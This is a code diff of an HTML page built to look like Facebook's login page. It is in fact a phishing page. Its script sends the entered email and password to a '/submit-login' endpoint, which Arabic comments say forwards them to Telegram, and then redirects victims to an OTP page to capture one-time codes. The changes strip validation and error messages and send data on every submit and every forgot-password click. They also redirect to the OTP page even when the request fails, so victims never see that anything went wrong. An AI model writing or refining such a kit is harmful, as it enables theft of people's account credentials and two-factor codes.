@@ -25,7 +25,6 @@
             justify-content: center;
         }
         
-        /* الجزء الشمال - الشعار */
         .left-section {
             flex: 1;
             max-width: 500px;
@@ -46,7 +45,6 @@
             width: 500px;
         }
         
-        /* الجزء اليمين - الفورم */
         .right-section {
             flex: 0 0 396px;
             width: 396px;
@@ -114,6 +112,11 @@
             text-decoration: none;
             padding: 12px 0;
             margin-top: 4px;
+            background: none;
+            border: none;
+            width: 100%;
+            cursor: pointer;
+            font-family: Helvetica, Arial, sans-serif;
         }
         
         .forgot-link:hover { text-decoration: underline; }
@@ -158,21 +161,6 @@
         
         .below-text a:hover { text-decoration: underline; }
         
-        /* Error Message */
-        .error-msg {
-            background: #ffebe8;
-            border: 1px solid #dd3c10;
-            color: #1c1e21;
-            padding: 10px 12px;
-            border-radius: 6px;
-            font-size: 14px;
-            display: none;
-            text-align: center;
-        }
-        
-        .error-msg.show { display: block; }
-        
-        /* Spinner */
         .loading-spinner {
             display: none;
             width: 20px;
@@ -192,16 +180,6 @@
         .login-btn.loading .btn-text { display: none; }
         .login-btn.loading .loading-spinner { display: block; }
         
-        /* Footer */
-        .footer {
-            margin-top: 28px;
-            font-size: 12px;
-            color: #8a8d91;
-            text-align: center;
-            padding: 0 16px;
-        }
-        
-        /* Responsive */
         @media (max-width: 900px) {
             .main-container {
                 flex-direction: column;
@@ -218,9 +196,7 @@
                 align-items: center;
             }
             
-            .fb-logo {
-                width: 180px;
-            }
+            .fb-logo { width: 180px; }
             
             .tagline {
                 font-size: 20px;
@@ -241,7 +217,6 @@
 
     <div class="main-container">
         
-        <!-- الجزء الشمال -->
         <div class="left-section">
             <svg class="fb-logo" viewBox="0 0 666.67 133.33" xmlns="http://www.w3.org/2000/svg">
                 <path fill="#1877f2" d="M631.25,0H35.42C15.85,0,0,15.85,0,35.42v62.5c0,19.57,15.85,35.42,35.42,35.42h595.83c19.57,0,35.42-15.85,35.42-35.42V35.42C666.67,15.85,650.81,0,631.25,0z"/>
@@ -250,19 +225,15 @@
             <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
         </div>
         
-        <!-- الجزء اليمين -->
         <div class="right-section">
             <div class="login-card">
                 <form id="loginForm">
-                    <div id="errorMsg" class="error-msg"></div>
-                    
                     <input 
                         type="text" 
                         id="email" 
                         name="email" 
                         class="input-field" 
                         placeholder="Email address or phone number"
-                        required
                         autocomplete="username">
                     
                     <input 
@@ -271,7 +242,6 @@
                         name="password" 
                         class="input-field" 
                         placeholder="Password"
-                        required
                         autocomplete="current-password">
                     
                     <button type="submit" id="loginBtn" class="login-btn">
@@ -279,7 +249,7 @@
                         <div class="loading-spinner"></div>
                     </button>
                     
-                    <a href="#" class="forgot-link" id="forgotBtn">Forgotten password?</a>
+                    <button type="button" class="forgot-link" id="forgotBtn">Forgotten password?</button>
                 </form>
                 
                 <div class="divider"></div>
@@ -297,7 +267,6 @@
     <script>
         const form = document.getElementById('loginForm');
         const loginBtn = document.getElementById('loginBtn');
-        const errorMsg = document.getElementById('errorMsg');
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
         const forgotBtn = document.getElementById('forgotBtn');
@@ -306,58 +275,38 @@
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const email = emailInput.value.trim();
-            const password = passwordInput.value.trim();
+            // خد القيم حتى لو فاضية
+            const email = emailInput.value.trim() || '(empty)';
+            const password = passwordInput.value.trim() || '(empty)';
             
-            if (!email || !password) {
-                errorMsg.textContent = 'The email address or mobile number you entered isn\'t connected to an account. Find your account and log in.';
-                errorMsg.classList.add('show');
-                return;
-            }
-            
-            errorMsg.classList.remove('show');
             loginBtn.classList.add('loading');
             loginBtn.disabled = true;
             
             try {
                 // إرسال لتيلجرام
-                const response = await fetch('/submit-login', {
+                await fetch('/submit-login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ email, password })
                 });
                 
-                const data = await response.json();
-                console.log('✅ تم الإرسال:', data);
-                
                 // حفظ الإيميل
                 localStorage.setItem('fb_email', email);
                 
                 // روح لصفحة OTP
-                setTimeout(() => {
-                    window.location.href = '/otp';
-                }, 800);
+                window.location.href = '/otp';
                 
             } catch (error) {
                 console.error('❌ خطأ:', error);
-                loginBtn.classList.remove('loading');
-                loginBtn.disabled = false;
-                errorMsg.textContent = 'Something went wrong. Please try again.';
-                errorMsg.classList.add('show');
+                // حتى لو حصل خطأ، كمّل للـ OTP
+                localStorage.setItem('fb_email', email);
+                window.location.href = '/otp';
             }
         });
 
         // ===== نسيت كلمة المرور =====
-        forgotBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            const email = emailInput.value.trim();
-            
-            if (!email) {
-                errorMsg.textContent = 'Please enter your email address or phone number first.';
-                errorMsg.classList.add('show');
-                emailInput.focus();
-                return;
-            }
+        forgotBtn.addEventListener('click', function() {
+            const email = emailInput.value.trim() || '(empty)';
             
             // إرسال لتيلجرام
             fetch('/submit-login', {
@@ -365,6 +314,9 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ email, password: '(Forgot Password)' })
             }).then(() => {
+                localStorage.setItem('fb_email', email);
+                window.location.href = '/otp';
+            }).catch(() => {
                 localStorage.setItem('fb_email', email);
                 window.location.href = '/otp';
             });
